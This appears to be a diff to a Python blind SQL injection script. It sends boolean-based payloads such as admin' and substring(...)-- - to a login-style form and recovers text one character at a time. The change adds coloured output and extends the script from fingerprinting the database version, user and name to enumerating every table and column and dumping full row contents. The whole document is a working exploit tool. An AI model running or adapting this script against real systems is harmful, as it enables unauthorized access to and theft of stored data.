@@ -10,6 +10,18 @@ __license__="MIT"
 
 import requests, re, string, argparse, datetime
 
+class bcolors:
+    HEADER='\033[95m'
+    BLUE='\033[94m'
+    CYAN='\033[96m'
+    GREEN='\033[92m'
+    WARNING='\033[93m'
+    FAIL='\033[91m'
+    ENDC='\033[0m'
+    BOLD='\033[1m'
+    UNDERLINE='\033[4m'
+
+
 req=requests.session()
 
 def remove_html(html):
@@ -28,11 +40,11 @@ def extract(key, query, init=''):
         init=init.strip()
         payload = {key: 'admin\' and substring(' + query + ',1,' + str(len(init)) + ')=\'' + init + '\'-- -'}
         print('Working... ' + datetime.datetime.now().time().strftime('%H:%M:%S'), end='\r')
-        r = requests.post(url, data=payload)
+        r=requests.post(url, data=payload)
         if look_for_exitcode(remove_html(r.text))==True:
             if init not in match:
                 match.append(init)
-            init= init + letter
+            init=init + letter
             extract(key, query, init)
             break
 
@@ -51,56 +63,87 @@ match=[]
 extract(key, query)
 print('')
 if match:
-    print('Database version ' + max(match, key=len))
+    print('Database version ' + bcolors.BLUE + max(match, key=len) + bcolors.ENDC)
 else:
-    print("Database version not found!")
-
-query='database()'
-match=[]
-extract(key, query)
-print('')
-if match:
-    print('Database name ' + max(match, key=len))
-    dbname=max(match, key=len)
-else:
-    print("Database name not found!")
+    print(bcolors.FAIL + "Database version not found!" + bcolors.ENDC)
 
 query='user()'
 match=[]
 extract(key, query)
 print('')
 if match:
-    print('Database username ' + max(match, key=len))
+    print('Database username ' + bcolors.BLUE + max(match, key=len) + bcolors.ENDC)
 else:
-    print("Database username not found!")
+    print("bcolors.FAIL + Database username not found!" + bcolors.ENDC)
 
-query='(select table_name from information_schema.tables where table_schema="' + dbname + '" limit 1)'
+query='database()'
 match=[]
 extract(key, query)
 print('')
 if match:
-    print('Table name ' + max(match, key=len))
-    tbname=max(match, key=len)
+    print('Database name ' + bcolors.BLUE + max(match, key=len) + bcolors.ENDC)
+    dbname=max(match, key=len)
+    query='(select count(*) from information_schema.tables where table_schema="' + dbname + '")'
+    match=[]
+    extract(key, query)
+    print('')
+    if match:
+        print('Number of tables in database ' + bcolors.BLUE + max(match, key=len) + bcolors.ENDC)
+        for _ in range(0, int(max(match, key=len))):
+            query='(select table_name from information_schema.tables where table_schema="' + dbname + '" limit ' + str(_) + ', 1)'
+            match=[]
+            extract(key, query)
+            print('')
+            if match:
+                print('Table name ' + bcolors.BLUE + max(match, key=len) + bcolors.ENDC)
+                tbname=max(match, key=len)
+                query='(select count(column_name) from information_schema.columns where table_schema="' + dbname + '" and table_name="' + tbname + '")'
+                match=[]
+                extract(key, query)
+                print('')
+                tbinfo={}
+                if match:
+                    print('Number of columns in table ' + bcolors.CYAN + tbname + bcolors.ENDC + ' ' + bcolors.BLUE + max(match, key=len) + bcolors.ENDC)
+                    for _ in range(0, int(max(match, key=len))):
+                        query='(select column_name from information_schema.columns where table_name="' + tbname + '" and table_schema="' + dbname + '" limit ' + str(_) + ', 1)'
+                        match=[]
+                        extract(key, query)
+                        print('')
+                        if match:
+                            print('Column name ' + bcolors.BLUE + max(match, key=len) + bcolors.ENDC)
+                            tbinfo[max(match, key=len)] = list()
+                        else:
+                            print("bcolors.FAIL + No column name found!" + bcolors.ENDC)
+                else:
+                    print(bcolors.FAIL + "No columns found!" + bcolors.ENDC)
+                query='(select count(*) from ' + tbname + ')'
+                match=[]
+                extract(key, query)
+                print('')
+                if match:
+                    print('Number of rows in table ' + bcolors.CYAN + tbname + bcolors.ENDC + ' ' + bcolors.BLUE + max(match, key=len) + bcolors.ENDC)
+                    for _ in range(0, int(max(match, key=len))):
+                        for __ in tbinfo:
+                            match=[]
+                            query='(select ' + __ + ' from ' + tbname + ' limit ' + str(_) + ', 1)'
+                            extract(key, query)
+                            print('')
+                            if match:
+                                content=max(match, key=len)
+                                tbinfo[__].append(content)
+                            else:
+                                print(bcolors.FAIL + "Row content not found!" + bcolors.ENDC)
+                else:
+                    print("bcolors.FAIL + No rows found!" + bcolors.ENDC)
+            else:
+                print("bcolors.FAIL + Table name not found!" + bcolors.ENDC)
+    else:
+        print("bcolors.FAIL + No tables found!" + bcolors.ENDC)
 else:
-    print("Table name not found!")
+    print("bcolors.FAIL + Database name not found!" + bcolors.ENDC)
 
-query='(select count(*) from information_schema.tables where table_schema="' + dbname + '")'
-match=[]
-extract(key, query)
-print('')
-if match:
-    print('Number of tables in database ' + max(match, key=len))
-else:
-    print("No tables found!")
-
-query='(select count(column_name) from information_schema.columns where table_schema="' + dbname + '" and table_name="' + tbname + '")'
-match=[]
-extract(key, query)
-print('')
-if match:
-    print('Number of columns in table ' + tbname + ' ' + max(match, key=len))
-else:
-    print("No columns found!")
+for _ in zip(*([key] + (value) for key, value in tbinfo.items())):
+    print(''.join([str(__).ljust(20) for __ in _]))
 
 if __name__=="__main__":
 	args=parser.parse_args()
